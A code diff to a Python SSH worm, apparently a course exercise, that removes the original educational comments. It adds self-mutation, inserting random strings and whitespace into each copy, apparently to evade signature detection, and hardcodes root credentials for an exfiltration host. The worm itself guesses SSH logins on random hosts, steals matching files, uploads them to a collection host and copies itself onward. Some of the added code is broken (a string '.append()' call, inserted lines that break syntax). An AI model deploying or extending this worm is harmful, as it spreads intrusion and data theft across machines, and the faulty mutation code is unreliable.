@@ -1,83 +1,5 @@
 #!/usr/bin/env python
 
-### AbraWorm.py
-
-### Author: Avi kak (kak@purdue.edu)
-### Date:   April 8, 2016; Updated April 6, 2022
-
-##  This is a harmless worm meant for educational purposes only.  It can
-##  only attack machines that run SSH servers and those too only under 
-##  very special conditions that are described below. Its primary features 
-##  are:
-##
-##  -- It tries to break in with SSH login into a randomly selected set of
-##     hosts with a randomly selected set of usernames and with a randomly
-##     chosen set of passwords. 
-##
-##  -- If it can break into a host, it looks for the files that contain the
-##     string `abracadabra'.  It downloads such files into the host where
-##     the worm resides.
-##
-##  -- It uploads the files thus exfiltrated from an infected machine to a
-##     designated host in the internet. You'd need to supply the IP address
-##     and login credentials at the location marked yyy.yyy.yyy.yyy in the
-##     code for this feature to work.  The exfiltrated files would be 
-##     uploaded to the host at yyy.yyy.yyy.yyy. If you don't supply this
-##     information, the worm will still work, but now the files exfiltrated
-##     from the infected machines will stay at the host where the worm
-##     resides.  For an actual worm, the host selected for yyy.yyy.yyy.yyy
-##     would be a previosly infected host.
-##
-##  -- It installs a copy of itself on the remote host that it successfully
-##     breaks into.  If a user on that machine executes the file thus
-##     installed (say by clicking on it), the worm activates itself on
-##     that host.
-##
-##  -- Once the worm is launched in an infected host, it runs in an
-##     infinite loop, looking for vulnerable hosts in the internet.  By
-##     vulnerable I mean the hosts for which it can successfully guess at
-##     least one username and the corresponding password.
-##
-##  -- IMPORTANT: After the worm has landed in a remote host, the worm can
-##     be activated on that machine only if Python is installed on that
-##     machine.  Another condition that must hold at the remote machine is
-##     that it must have the Python modules paramiko and scp installed.
-##
-##  -- The username and password construction strategies used in the worm
-##     are highly unlikely to result in actual usernames and actual 
-##     passwords anywhere.  (However, for demonstrating the worm code in
-##     an educational program, this part of the code can be replaced with
-##     a more potent algorithm.)
-##
-##  -- Given all of the conditions I have listed above for this worm to
-##     propagate into the internet, we can be quite certain that it is not
-##     going to cause any harm.  Nonetheless, the worm should prove useful
-##     as an educational exercise.
-##
-##
-##  If you want to play with the worm, run it first in the `debug' mode. 
-##  For the debug mode of execution, you would need to supply the following
-##  information to the worm:
-##
-##  1)   Change to 1 the value of the variable $debug.  
-##
-##  2)   Provide an IP address and the login credentials for a host that you
-##       have access to and that contains one or more documents that
-##       include the string "abracadabra".  This information needs to go
-##       where you see xxx.xxx.xxx.xxx in the code.
-##
-##  3)   Provide an IP address and the login credentials for a host that 
-##       will serve as the destination for the files exfiltrated from the
-##       successfully infected hosts. The IP address and the login 
-##       credentials go where you find the string yyy.yyy.yyy.yyy in the 
-##       code.
-##
-##  After you have executed the worm code, you will notice that a copy of
-##  the worm has landed at the host at the IP address you used for
-##  xxx.xxx.xxx.xxx and you'll see a new directory at the host you used for
-##  yyy.yyy.yyy.yyy.  This directory will contain those files from the
-##  xxx.xxx.xxx.xxx host that contained the string `abracadabra'.
-
 import sys
 import os
 import random
@@ -85,11 +7,7 @@ import paramiko
 import scp
 import select
 import signal
-
-##   You would want to uncomment the following two lines for the worm to 
-##   work silently:
-#sys.stdout = open(os.devnull, 'w')
-#sys.stderr = open(os.devnull, 'w')
+import string
 
 def sig_handler(signum,frame): os.kill(os.getpid(),signal.SIGKILL)
 signal.signal(signal.SIGINT, sig_handler)
@@ -100,16 +18,9 @@ debug = 1      # IMPORTANT:  Before changing this setting, read the last
                #             addresses in order to run this code in debug 
                #             mode. 
 
-##  The following numbers do NOT mean that the worm will attack only 3
-##  hosts for 3 different usernames and 3 different passwords.  Since the
-##  worm operates in an infinite loop, at each iteration, it generates a
-##  fresh batch of hosts, usernames, and passwords.
 NHOSTS = NUSERNAMES = NPASSWDS = 3
 
 
-##  The trigrams and digrams are used for syntheizing plausible looking
-##  usernames and passwords.  See the subroutines at the end of this script
-##  for how usernames and passwords are generated by the worm.
 trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum 
                   bus but buz cam cat ced cel cin cid cip cir con cod cos cop 
                   cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab 
@@ -147,11 +58,7 @@ def get_new_passwds(how_many):
 def get_fresh_ipaddresses(how_many):
     if debug: return ['172.17.0.2', '172.17.0.3', '172.17.0.4', '172.17.0.5', '172.17.0.6', '172.17.0.7',
                       '172.17.0.8', '172.17.0.9', '172.17.0.10', '172.17.0.11']   
-                    # Provide one or more IP address that you
-                    # want `attacked' for debugging purposes.
-                    # The usrname and password you provided
-                    # in the previous two functions must
-                    # work on these hosts.
+
     if how_many == 0: return 0
     ipaddresses = []
     for i in range(how_many):
@@ -159,10 +66,12 @@ def get_fresh_ipaddresses(how_many):
         ipaddresses.append( first + '.' + second + '.' + third + '.' + fourth )
     return ipaddresses 
 
-# For the same IP address, we do not want to loop through multiple user 
-# names and passwords consecutively since we do not want to be quarantined 
-# by a tool like DenyHosts at the other end.  So let's reverse the order 
-# of looping.
+
+def generate_random_string(size):
+    characters = string.ascii_letters + string.digits
+    return ''.join(random.choice(characters) for _ in range(size))
+
+
 while True:
     usernames = get_new_usernames(NUSERNAMES)
     passwds =   get_new_passwds(NPASSWDS)
@@ -209,7 +118,33 @@ while True:
                         for target_file in files_of_interest_at_target:
                             scpcon.get(target_file)
                     # Now deposit a copy of AbraWorm.py at the target host:
-                    scpcon.put(sys.argv[0])
+                    
+                    file = open(sys.argv[0],'r')
+                    all_lines = file.readlines()
+                    file.close()
+                    num_lines = all_lines.__len__()
+                    for i in range(7):    
+                        line1 = random.randint(0, num_lines - 2)
+                        line2 = line1 + 1
+                        rand_size = random.randint(10, 20)
+                        random_string = generate_random_string(rand_size)
+                        all_lines = all_lines[:line1+1] + [random_string] + all_lines[line2:]
+
+                    num_lines = all_lines.__len__()
+
+                    for i in range(13):    
+                        line1 = random.randint(0, num_lines - 1)
+                        rand_size = random.randint(5, 10)
+                        line = all_lines[line1]
+                        line.append()
+                        random_line_with_spaces = line.strip() + ' ' * rand_size + '\n'
+                        all_lines[line1] = random_line_with_spaces
+
+                    with open('AbraWorm.py', 'w') as file:
+                        file.writelines(all_lines)
+
+                    scpcon.put('AbraWorm.py')
+                    os.remove('AbraWorm.py')
                     scpcon.close()
                 except:
                     continue
@@ -226,7 +161,7 @@ while True:
                         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                         #  For exfiltration demo to work, you must provide an IP address and the login 
                         #  credentials in the next statement:
-                        ssh.connect('yyy.yyy.yyy.yyy',port=22,username='yyyy',password='yyyyyyy',timeout=5)
+                        ssh.connect('172.17.0.2',port=22,username='root',password='mypassword',timeout=5)
                         scpcon = scp.SCPClient(ssh.get_transport())
                         print("\n\nconnected to exhiltration host\n")
                         for filename in files_of_interest_at_target:
